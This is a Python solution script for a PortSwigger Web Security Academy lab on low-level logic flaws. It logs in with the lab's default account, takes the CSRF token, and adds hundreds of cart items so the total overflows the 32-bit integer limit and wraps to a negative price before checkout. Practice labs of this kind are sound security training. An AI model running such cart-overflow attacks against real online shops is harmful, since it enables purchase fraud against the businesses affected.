# https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-low-level
# In this logic flaw, we need to make enough request to reach the maximum integer value: 2,147,483,647. As a result, this number will loop back around to the minimum possible value (-2,147,483,648). 

import urllib3
import urllib
import sys
import requests
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def logicFlaw(url):

    # Login
    username = "wiener"
    password = "peter"
    loginUrl = url + "/login"

    r = requests.session()

    rLogin = r.get(loginUrl, verify=False, proxies=proxies)

    soup = BeautifulSoup(rLogin.text, 'html.parser')
    csrf_value = soup.find('input', {'name': 'csrf'}).get('value')

    print("[ + ] Logging as %s..." % (username))

    params = { 
                "csrf": csrf_value,
                "username": username, 
                "password": password,
            }
    
    rLogin = r.post(loginUrl, verify=False, proxies=proxies, data=params)

    addItemsUrl = url + "/cart"

    params = {
        "productId": 1,
        "redir": "PRODUCT",
        "quantity": 99
    }
 
    for i in range(324):
        print(" "*50, end='\r', flush=True)
        sys.stdout.write('\r' + "Adding Product: " + str(i))
        rAddItem = r.post(addItemsUrl, verify=False, proxies=proxies, data=params)
    
    params = {
        "productId": 1,
        "redir": "PRODUCT",
        "quantity": 47
    }

    rAddItem = r.post(addItemsUrl, verify=False, proxies=proxies, data=params)

    params = {
        "productId": 5,
        "redir": "PRODUCT",
        "quantity": 15
    }

    rAddItem = r.post(addItemsUrl, verify=False, proxies=proxies, data=params)

    print("\nOpen cart and do the checkout!")

def main():
    if len(sys.argv) != 2:
        print("Usage: %s <URL>" % sys.argv[0])
        print("Example: %s https://victim.com" % sys.argv[0])

    url = sys.argv[1]
    logicFlaw(url)

if __name__ == "__main__":
    main() 
